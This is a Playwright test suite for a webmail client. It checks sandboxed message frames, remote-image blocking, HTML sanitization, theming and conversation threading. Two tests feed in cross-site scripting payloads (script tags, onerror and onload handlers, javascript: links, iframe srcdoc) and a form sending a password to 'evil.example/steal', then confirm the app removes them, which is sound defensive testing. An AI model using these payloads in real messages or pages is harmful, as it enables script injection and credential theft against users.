import { expect, test } from "@playwright/test";
import { STORAGE_STATE, SUPPORT_ADDRESS } from "./support/constants";
import { apiContext, deliverInbound, openMessage, uniqueToken } from "./support/helpers";

const PIXEL = Buffer.from(
	"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=",
	"base64",
);

test("renders HTML in a sandboxed frame and holds remote images until asked", async ({ page }) => {
	const api = await apiContext(STORAGE_STATE);
	const subject = `Newsletter ${uniqueToken()}`;
	await deliverInbound(api, {
		from: `"Remote Sender" <sender@outside.test>`,
		to: SUPPORT_ADDRESS,
		subject,
		html: `<p>Hello <b>reader</b></p><script>window.parent.__pwned = true</script><img src="https://images.e2e.test/pixel.png" alt="tracking pixel">`,
	});
	await api.dispose();

	// A shown remote image loads through the same-origin proxy (e2e/42-remote-images.spec.ts covers the proxy itself).
	let imageRequests = 0;
	let directRequests = 0;
	await page.route("**/api/remote-images?**", (route) => {
		const url = new URL(route.request().url());
		if (url.searchParams.get("url") === "https://images.e2e.test/pixel.png") imageRequests += 1;
		return route.fulfill({ status: 200, contentType: "image/png", body: PIXEL });
	});
	await page.route("https://images.e2e.test/**", (route) => {
		directRequests += 1;
		return route.abort();
	});

	await page.goto("/inbox");
	await openMessage(page, subject);
	await expect(page.getByRole("heading", { level: 1, name: subject })).toBeVisible();

	const frameElement = page.getByTitle("Message body");
	await expect(frameElement).toBeVisible();
	const sandbox = await frameElement.getAttribute("sandbox");
	expect(sandbox).not.toBeNull();
	expect(sandbox).not.toContain("allow-scripts");

	const body = page.frameLocator('iframe[title="Message body"]');
	await expect(body.getByText("reader")).toBeVisible();
	await expect(body.getByRole("img", { name: "tracking pixel" })).toHaveCount(0);
	await expect(page.getByText("Remote images are hidden to protect your privacy.")).toBeVisible();
	expect(imageRequests).toBe(0);
	expect(await page.evaluate(() => (window as unknown as { __pwned?: boolean }).__pwned)).toBeUndefined();

	await page.getByRole("button", { name: "Show images" }).click();
	await expect(body.getByRole("img", { name: "tracking pixel" })).toHaveCount(1);
	await expect(page.getByText("Remote images are hidden to protect your privacy.")).toBeHidden();
	await expect.poll(() => imageRequests).toBeGreaterThan(0);
	expect(directRequests).toBe(0);
});

test("stores received HTML without active content and the reader keeps it inert", async ({ page }) => {
	const api = await apiContext(STORAGE_STATE);
	const subject = `Hostile ${uniqueToken()}`;
	const stored = await deliverInbound(api, {
		from: `"Hostile Sender" <hostile@outside.test>`,
		to: SUPPORT_ADDRESS,
		subject,
		html: [
			'<p class="lead">Visible <b>text</b></p>',
			'<img src="x" onerror="window.parent.__pwned = true" alt="broken">',
			'<a href="javascript:window.parent.__pwned = true">Click me</a>',
			'<iframe srcdoc="<script>parent.parent.__pwned = true</script>"></iframe>',
			'<form action="https://evil.example/steal"><input name="password"></form>',
			'<svg onload="window.parent.__pwned = true"></svg>',
		].join(""),
	});
	const detail = (await (await api.get(`/api/messages/${stored.id}`)).json()) as { body: { htmlBody: string } };
	await api.dispose();
	const htmlBody = detail.body.htmlBody;
	expect(htmlBody).toContain('<p class="lead">Visible <b>text</b></p>');
	expect(htmlBody).toContain("Click me");
	expect(htmlBody).not.toMatch(/onerror|onload|javascript:|<iframe|<form|<input|<svg|<script/i);

	await page.goto("/inbox");
	await openMessage(page, subject);
	const body = page.frameLocator('iframe[title="Message body"]');
	await expect(body.getByText("Visible")).toBeVisible();
	await expect(body.getByText("Click me")).not.toHaveAttribute("href");
	await expect(body.locator("iframe, form, input, svg")).toHaveCount(0);
	expect(await page.evaluate(() => (window as unknown as { __pwned?: boolean }).__pwned)).toBeUndefined();
});

test("a draft written outside the composer is sanitized before the editor renders it", async ({ page }) => {
	const api = await apiContext(STORAGE_STATE);
	const { mailboxes } = (await (await api.get("/api/mailboxes")).json()) as {
		mailboxes: { id: string; localPart: string; hostname: string }[];
	};
	const mailbox = mailboxes.find((item) => `${item.localPart}@${item.hostname}` === SUPPORT_ADDRESS);
	expect(mailbox, SUPPORT_ADDRESS).toBeDefined();
	const subject = `Hostile draft ${uniqueToken()}`;
	const created = await api.post("/api/drafts", {
		data: {
			mailboxId: mailbox!.id,
			from: SUPPORT_ADDRESS,
			to: "someone@outside.test",
			subject,
			html: [
				'<p>Draft <b>body</b></p><img src="/missing.png" onerror="window.__pwned = true"><a href="javascript:window.__pwned = true">link</a>',
				'<div class="kite-quote" data-kite-quote="1">',
				'<p>Quoted <b>content</b></p><img src="/missing.png" onerror="window.__pwned = true"><a href="javascript:window.__pwned = true">quoted link</a>',
				"</div>",
			].join(""),
		},
	});
	expect(created.ok(), await created.text()).toBe(true);
	const { draft } = (await created.json()) as { draft: { id: string } };
	await api.dispose();

	await page.goto(`/drafts/${draft.id}`);
	const editor = page.getByRole("textbox", { name: "Message body" });
	await expect(editor.getByText("body")).toBeVisible();
	await expect(editor.locator("img")).toHaveCount(0);
	await expect(editor.getByText("link", { exact: true })).not.toHaveAttribute("href");
	// The folded quote is rendered separately from the editable body, so it needs its own check.
	await page.getByTitle("Show quoted text").click();
	const quoted = page.locator("div.email-body").filter({ hasText: "Quoted" });
	await expect(quoted.getByText("content")).toBeVisible();
	await expect(quoted.locator("img")).toHaveCount(0);
	await expect(quoted.getByText("quoted link")).not.toHaveAttribute("href");
	// Development pages allow inline handlers, so an unsanitized onerror would have run by now.
	expect(await page.evaluate(() => (window as unknown as { __pwned?: boolean }).__pwned)).toBeUndefined();
});

for (const theme of ["light", "dark"]) {
	test(`in ${theme} mode the message frame is transparent and shows the whole message`, async ({ page }) => {
		const api = await apiContext(STORAGE_STATE);
		const subject = `Frame ${theme} ${uniqueToken()}`;
		await deliverInbound(api, {
			from: `"Plain Sender" <plain@outside.test>`,
			to: SUPPORT_ADDRESS,
			subject,
			html: "<p>First paragraph.</p><ul><li>One</li><li>Two</li></ul><p>Best,<br>Last line</p>",
		});
		await api.dispose();
		await page.addInitScript((value) => localStorage.setItem("kite-theme", value), theme);

		await page.goto("/inbox");
		await openMessage(page, subject);
		const frame = page.getByTitle("Message body");
		await expect(frame.contentFrame().getByText(/Last line/)).toBeAttached();
		// A frame whose color-scheme differs from its document's gets an opaque canvas, and padding on
		// the frame shrinks its viewport below the measured height, cutting off the last line.
		await expect
			.poll(() =>
				frame.evaluate((element: HTMLIFrameElement) => {
					const root = element.contentDocument!.documentElement;
					return {
						scheme: getComputedStyle(element).colorScheme,
						documentScheme: getComputedStyle(root).colorScheme,
						clipped: element.contentWindow!.innerHeight < root.scrollHeight,
					};
				}),
			)
			.toEqual({ scheme: theme, documentScheme: theme, clipped: false });
	});
}

test("your own reply does not make a read conversation unread", async () => {
	const api = await apiContext(STORAGE_STATE);
	const token = uniqueToken();
	const received = await deliverInbound(api, {
		from: `"Reply Target" <target@outside.test>`,
		to: SUPPORT_ADDRESS,
		subject: `Question ${token}`,
		text: `Can you help ${token}?`,
		messageId: `<${token}@outside.test>`,
	});
	const marked = await api.post("/api/messages/bulk", { data: { action: "read", messageIds: [received.id] } });
	expect(marked.ok(), await marked.text()).toBe(true);

	const sent = await api.post("/api/send", {
		data: {
			from: SUPPORT_ADDRESS,
			to: "target@outside.test",
			subject: `Re: Question ${token}`,
			text: "Happy to help.",
			mailboxId: received.mailboxId,
			inReplyTo: `<${token}@outside.test>`,
			references: `<${token}@outside.test>`,
			threadId: received.threadId,
		},
	});
	expect(sent.ok(), await sent.text()).toBe(true);

	await expect
		.poll(async () => {
			const response = await api.get(
				`/api/messages?${new URLSearchParams({ status: "received", group: "thread", q: token })}`,
			);
			const data = (await response.json()) as {
				messages: { threadId?: string | null; threadCount?: number; threadUnread?: number }[];
			};
			const row = data.messages.find((message) => message.threadId === received.threadId);
			return row ? `${row.threadCount}/${row.threadUnread}` : "missing";
		})
		.toBe("2/0");
	await api.dispose();
});

test("shows a reply and its original as one conversation", async ({ page }) => {
	const api = await apiContext(STORAGE_STATE);
	const token = uniqueToken();
	const originalId = `<${token}@outside.test>`;
	await deliverInbound(api, {
		from: `"Thread Starter" <starter@outside.test>`,
		to: SUPPORT_ADDRESS,
		subject: `Planning ${token}`,
		text: `First message ${token}`,
		messageId: originalId,
	});
	await deliverInbound(api, {
		from: `"Thread Starter" <starter@outside.test>`,
		to: SUPPORT_ADDRESS,
		subject: `Re: Planning ${token}`,
		text: `Follow-up message ${token}`,
		inReplyTo: originalId,
	});
	await api.dispose();

	await page.goto("/inbox");
	await openMessage(page, `Re: Planning ${token}`);
	// The list beside the reading pane shows the same text as its preview line.
	await expect(page.locator("[data-reading-pane] > section").getByText(`Follow-up message ${token}`)).toBeVisible();

	const earlier = page.getByRole("region", { name: "Earlier messages in this conversation" });
	await expect(earlier.getByRole("listitem")).toHaveCount(1);
	await earlier.getByRole("button", { name: /Thread Starter/ }).click();
	await expect(earlier.getByText(`First message ${token}`)).toBeVisible();
});
